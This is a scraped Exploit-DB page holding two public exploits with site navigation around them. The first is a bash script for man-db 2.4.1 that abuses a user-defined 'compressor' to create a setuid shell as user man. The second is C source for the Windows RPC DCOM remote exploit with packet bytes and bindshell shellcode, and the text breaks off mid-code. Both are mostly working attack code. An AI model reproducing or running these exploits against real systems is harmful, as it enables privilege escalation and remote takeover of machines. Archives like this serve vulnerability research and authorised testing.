}window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDman-db 2.4.1 - 'open_cat_stream()' Local uid=manEDB-ID:75CVE:2003-0645EDB Verified:Author:vade79Type:localExploit:/Platform:LinuxDate:2003-08-06Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/bin/bash# xmandb.sh: shell command file.## man-db[v2.4.1-]: local uid=man exploit.# by: vade79/v9 v9 fakehalo deadpig org (fakehalo)## open_cat_stream() privileged call exploit.## i've been conversing with the new man-db maintainer, and after the# initial post sent to bugtraq(which i forgot to inform him), i sent him# an email highlighting another vulnerability i forgot to mention in the# original advisory.## once he checked it out, he noticed that the routine never dropped# privileges before/after the potential buffer/elemental overflow occured,# and executed the (user defined) "compressor" binary.  making it# pointless to exploit this via the overflow method, and all-purpose to# exploit this via the privileged execve() call method.## best of luck to the new maintainer(Colin Watson<cjwatson debian org>),# he noticed it before i did, so he's on the right track. :)## example:#  [v9@localhost v9]$ id#  uid=500(v9) gid=500(v9) groups=500(v9)#  [v9@localhost v9]$ ./xmandb.sh#  [*] making fake manpage directories/files...#  [*] making runme, and mansh source files...#  [*] compiling runme source...#  [*] setting "compressor" to: /tmp/runme...#  [*] executing man-db/man...#  [*] cleaning up files...#  [*] success, entering shell.#  -rws--x---    1 man      v9          13963 Jun 13 20:09 /tmp/mansh#  sh-2.04$ id#  uid=15(man) gid=500(v9) groups=500(v9)#  sh-2.04$## (tested on redhat7.1, from src, should work out of the box everywhere)MANBIN=/usr/bin/manMANDIR=man_xTMPDIR=/tmpecho "man-db[v2.4.1-]: local uid=man exploit."echo -e "by: vade79/v9 v9 fakehalo deadpig org (fakehalo)\n"if [ ! "`$MANBIN -V 2>/dev/null`" ]thenecho "[!] \"$MANBIN\" does not appear to be man-db, failed."exitfiumask 002cd $TMPDIRecho "[*] making fake manpage directories/files..."mkdir $MANDIR ${MANDIR}/man1 ${MANDIR}/cat1touch ${MANDIR}/man1/x.1echo "[*] making runme, and mansh source files..."cat <<EOF>runme.c#include <stdio.h>#include <stdlib.h>#include <unistd.h>#include <sys/types.h>#include <sys/stat.h>int main(int argc,char **argv){setreuid(geteuid(),geteuid());system("cc ${TMPDIR}/mansh.c -o ${TMPDIR}/mansh");chmod("${TMPDIR}/mansh",S_ISUID|S_IRUSR|S_IWUSR|S_IXUSR|S_IXGRP);unlink(argv[0]);exit(0);}EOFcat <<EOF>mansh.c#include <stdio.h>#include <sys/types.h>#include <unistd.h>int main(){setreuid(geteuid(),geteuid());execl("/bin/sh","sh",0);exit(0);}EOFecho "[*] compiling runme source..."cc runme.c -o runmeecho "[*] setting \"compressor\" to: ${TMPDIR}/runme..."echo "DEFINE compressor ${TMPDIR}/runme">~/.manpathecho "[*] executing man-db/man..."$MANBIN -M ${TMPDIR}/$MANDIR -P /bin/true x 1>/dev/null 2>&1echo "[*] cleaning up files..."rm -rf $MANDIR mansh.c runme.c runme ~/.manpathif test -u "${TMPDIR}/mansh"thenecho "[*] success, entering shell."ls -l ${TMPDIR}/mansh${TMPDIR}/manshelseecho "[!] exploit failed."rm -rf ${TMPDIR}/manshfiexit// milw0rm.com [2003-08-06]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 76
Microsoft Windows - 'RPC DCOM' Remote (Universal) - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows - 'RPC DCOM' Remote (Universal)EDB-ID:76CVE:2003-0605EDB Verified:Author:oc192Type:remoteExploit:/Platform:WindowsDate:2003-08-07Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/* Windows remote RPC DCOM exploit* Coded by oc192** Includes 2 universal targets, 1 for win2k, and 1 for winXP. This exploit uses* ExitThread in its shellcode to prevent the RPC service from crashing upon* successful exploitation. It also has several other options including definable* bindshell and attack ports.** Features:** -d destination host to attack.** -p for port selection as exploit works on ports other than 135(139,445,539 etc)** -r for using a custom return address.** -t to select target type (Offset) , this includes universal offsets for -*    win2k and winXP (Regardless of service pack)** -l to select bindshell port on remote machine (Default: 666)** - Shellcode has been modified to call ExitThread, rather than ExitProcess, thus*   preventing crash of RPC service on remote machine.**   This is provided as proof-of-concept code only for educational*   purposes and testing by authorized individuals with permission to*   do so.*/#include <stdio.h>#include <stdlib.h>#include <sys/types.h>#include <sys/socket.h>#include <netinet/in.h>#include <arpa/inet.h>#include <unistd.h>#include <netdb.h>#include <fcntl.h>#include <unistd.h>/* xfocus start */unsigned char bindstr[]={0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};unsigned char request1[]={0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0xE8,0x03,0x00,0x00,0xE5,0x00,0x00,0x00,0xD0,0x03,0x00,0x00,0x01,0x00,0x04,0x00,0x05,0x00,0x06,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x32,0x24,0x58,0xFD,0xCC,0x45,0x64,0x49,0xB0,0x70,0xDD,0xAE,0x74,0x2C,0x96,0xD2,0x60,0x5E,0x0D,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x5E,0x0D,0x00,0x02,0x00,0x00,0x00,0x7C,0x5E,0x0D,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x80,0x96,0xF1,0xF1,0x2A,0x4D,0xCE,0x11,0xA6,0x6A,0x00,0x20,0xAF,0x6E,0x72,0xF4,0x0C,0x00,0x00,0x00,0x4D,0x41,0x52,0x42,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0xA8,0xF4,0x0B,0x00,0x60,0x03,0x00,0x00,0x60,0x03,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xA2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x03,0x00,0x00,0x28,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0xC8,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x28,0x03,0x00,0x00,0xD8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xC4,0x28,0xCD,0x00,0x64,0x29,0xCD,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0xB9,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAB,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA5,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA6,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA4,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAD,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAA,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x07,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x58,0x00,0x00,0x00,0x90,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x78,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x50,0x00,0x00,0x00,0x4F,0xB6,0x88,0x20,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x48,0x00,0x00,0x00,0x07,0x00,0x66,0x00,0x06,0x09,0x02,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x78,0x19,0x0C,0x00,0x58,0x00,0x00,0x00,0x05,0x00,0x06,0x00,0x01,0x00,0x00,0x00,0x70,0xD8,0x98,0x93,0x98,0x4F,0xD2,0x11,0xA9,0x3D,0xBE,0x57,0xB2,0x00,0x00,0x00,0x32,0x00,0x31,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x80,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x18,0x43,0x14,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xC0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x3B,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x81,0xC5,0x17,0x03,0x80,0x0E,0xE9,0x4A,0x99,0x99,0xF1,0x8A,0x50,0x6F,0x7A,0x85,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x30,0x00,0x00,0x00,0x78,0x00,0x6E,0x00,0x00,0x00,0x00,0x00,0xD8,0xDA,0x0D,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x2F,0x0C,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x46,0x00,0x58,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x10,0x00,0x00,0x00,0x30,0x00,0x2E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x68,0x00,0x00,0x00,0x0E,0x00,0xFF,0xFF,0x68,0x8B,0x0B,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};unsigned char request2[]={0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x5C,0x00,0x5C,0x00};unsigned char request3[]={0x5C,0x00,0x43,0x00,0x24,0x00,0x5C,0x00,0x31,0x00,0x32,0x00,0x33,0x00,0x34,0x00,0x35,0x00,0x36,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x2E,0x00,0x64,0x00,0x6F,0x00,0x63,0x00,0x00,0x00};/* end xfocus */int type=0;struct{char *os;u_long ret;}targets[] ={{ "[Win2k-Universal]", 0x0018759F },{ "[WinXP-Universal]", 0x0100139d },}, v;void usage(char *prog){int i;printf("RPC DCOM exploit coded by .:[oc192.us]:. Security\n");printf("Usage:\n\n");printf("%s -d <host> [options]\n", prog);printf("Options:\n");printf("	-d:		Hostname to attack [Required]\n");printf("	-t:		Type [Default: 0]\n");printf("	-r:		Return address [Default: Selected from target]\n");printf("	-p:		Attack port [Default: 135]\n");printf("	-l:		Bindshell port [Default: 666]\n\n");printf("Types:\n");for(i = 0; i < sizeof(targets)/sizeof(v); i++)printf("	%d [0x%.8x]: %s\n", i, targets[i].ret, targets[i].os);exit(0);}unsigned char sc[]="\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00""\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00""\x46\x00\x58\x00\x46\x00\x58\x00""\xff\xff\xff\xff" /* return address */"\xcc\xe0\xfd\x7f" /* primary thread data block */"\xcc\xe0\xfd\x7f" /* primary thread data block *//* bindshell no RPC crash, defineable spawn port */"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\xeb\x19\x5e\x31\xc9\x81\xe9\x89\xff""\xff\xff\x81\x36\x80\xbf\x32\x94\x81\xee\xfc\xff\xff\xff\xe2\xf2""\xeb\x05\xe8\xe2\xff\xff\xff\x03\x53\x06\x1f\x74\x57\x75\x95\x80""\xbf\xbb\x92\x7f\x89\x5a\x1a\xce\xb1\xde\x7c\xe1\xbe\x32\x94\x09""\xf9\x3a\x6b\xb6\xd7\x9f\x4d\x85\x71\xda\xc6\x81\xbf\x32\x1d\xc6""\xb3\x5a\xf8\xec\xbf\x32\xfc\xb3\x8d\x1c\xf0\xe8\xc8\x41\xa6\xdf""\xeb\xcd\xc2\x88\x36\x74\x90\x7f\x89\x5a\xe6\x7e\x0c\x24\x7c\xad""\xbe\x32\x94\x09\xf9\x22\x6b\xb6\xd7\xdd\x5a\x60\xdf\xda\x8a\x81""\xbf\x32\x1d\xc6\xab\xcd\xe2\x84\xd7\xf9\x79\x7c\x84\xda\x9a\x81""\xbf\x32\x1d\xc6\xa7\xcd\xe2\x84\xd7\xeb\x9d\x75\x12\xda\x6a\x80""\xbf\x32\x1d\xc6\xa3\xcd\xe2\x84\xd7\x96\x8e\xf0\x78\xda\x7a\x80""\xbf\x32\x1d\xc6\x9f\xcd\xe2\x84\xd7\x96\x39\xae\x56\xda\x4a\x80""\xbf\x32\x1d\xc6\x9b\xcd\xe2\x84\xd7\xd7\xdd\x06\xf6\xda\x5a\x80""\xbf\x32\x1d\xc6\x97\xcd\xe2\x84\xd7\xd5\xed\x46\xc6\xda\x2a\x80""\xbf\x32\x1d\xc6\x93\x01\x6b\x01\x53\xa2\x95\x80\xbf\x66\xfc\x81""\xbe\x32\x94\x7f\xe9\x2a\xc4\xd0\xef\x62\xd4\xd0\xff\x62\x6b\xd6""\xa3\xb9\x4c\xd7\xe8\x5a\x96\x80\xae\x6e\x1f\x4c\xd5\x24\xc5\xd3""\x40\x64\xb4\xd7\xec\xcd\xc2\xa4\xe8\x63\xc7\x7f\xe9\x1a\x1f\x50""\xd7\x57\xec\xe5\xbf\x5a\xf7\xed\xdb\x1c\x1d\xe6\x8f\xb1\x78\xd4""\x32\x0e\xb0\xb3\x7f\x01\x5d\x03\x7e\x27\x3f\x62\x42\xf4\xd0\xa4""\xaf\x76\x6a\xc4\x9b\x0f\x1d\xd4\x9b\x7a\x1d\xd4\x9b\x7e\x1d\xd4""\x9b\x62\x19\xc4\x9b\x22\xc0\xd0\xee\x63\xc5\xea\xbe\x63\xc5\x7f""\xc9\x02\xc5\x7f\xe9\x22\x1f\x4c\xd5\xcd\x6b\xb1\x40\x64\x98\x0b""\x77\x65\x6b\xd6\x93\xcd\xc2\x94\xea\x64\xf0\x21\x8f\x32\x94\x80""\x3a\xf2\xec\x8c\x34\x72\x98\x0b\xcf\x2e\x39\x0b\xd7\x3a\x7f\x89""\x34\x72\xa0\x0b\x17\x8a\x94\x80\xbf\xb9\x51\xde\xe2\xf0\x90\x80""\xec\x67\xc2\xd7\x34\x5e\xb0\x98\x34\x77\xa8\x0b\xeb\x37\xec\x83""\x6a\xb9\xde\x98\x34\x68\xb4\x83\x62\xd1\xa6\xc9\x34\x06\x1f\x83""\x4a\x01\x6b\x7c\x8c\xf2\x38\xba\x7b\x46\x93\x41\x70\x3f\x97\x78""\x54\xc0\xaf\xfc\x9b\x26\xe1\x61\x34\x68\xb0\x83\x62\x54\x1f\x8c""\xf4\xb9\xce\x9c\xbc\xef\x1f\x84\x34\x31\x51\x6b\xbd\x01\x54\x0b""\x6a\x6d\xca\xdd\xe4\xf0\x90\x80\x2f\xa2\x04";/* xfocus start */unsigned char request4[]={0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x20,0x00,0x00,0x00,0x30,0x00,0x2D,0x00,0x00,0x00,0x00,0x00,0x88,0x2A,0x0C,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x28,0x8C,0x0C,0x00,0x01,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00};/* end xfocus *//* Not ripped from teso =) */void con(int sockfd){char rb[1500];fd_set  fdreadme;int i;FD_ZERO(&fdreadme);FD_SET(sockfd, &fdreadme);FD_SET(0, &fdreadme);while(1){FD_SET(sockfd, &fdreadme);FD_SET(0, &fdreadme);if(select(FD_SETSIZE, &fdreadme, NULL, NULL, NULL) < 0 ) break;if(FD_ISSET(sockfd, &fdreadme)){if((i = recv(sockfd, rb, sizeof(rb), 0)) < 0){printf("[-] Connection lost..\n");exit(1);}if(write(1, rb, i) < 0) break;}if(FD_ISSET(0, &fdreadme)){if((i = read(0, rb, sizeof(rb))) < 0){printf("[-] Connection lost..\n");exit(1);}if (send(sockfd, rb, i, 0) < 0) break;}usleep(10000);}printf("[-] Connection closed by foreign host..\n");exit(0);}int main(int argc, char **argv){int len, len1, sockfd, c, a;unsigned long ret;unsigned short port = 135;unsigned char buf1[0x1000];unsigned char buf2[0x1000];unsigned short lportl=666; /* drg */char lport[4] = "\x00\xFF\xFF\x8b"; /* drg */struct hostent *he;struct sockaddr_in their_addr;static char *hostname=NULL;if(argc<2){usage(argv[0]);}while((c = getopt(argc, argv, "d:t:r:p:l:"))!= EOF){switch (c){case 'd':hostname = optarg;break;case 't':type = atoi(optarg);if((type > 1) || (type < 0)){printf("[-] Select a valid target:\n");for(a = 0; a < sizeof(targets)/sizeof(v); a++)printf("    %d [0x%.8x]: %s\n", a, targets[a].ret, targets[a].os);return 1;}break;case 'r':targets[type].ret = strtoul(optarg, NULL, 16);break;case 'p':port = atoi(optarg);if((port > 65535) || (port < 1)){printf("[-] Select a port between 1-65535\n");return 1;}break;case 'l':lportl = 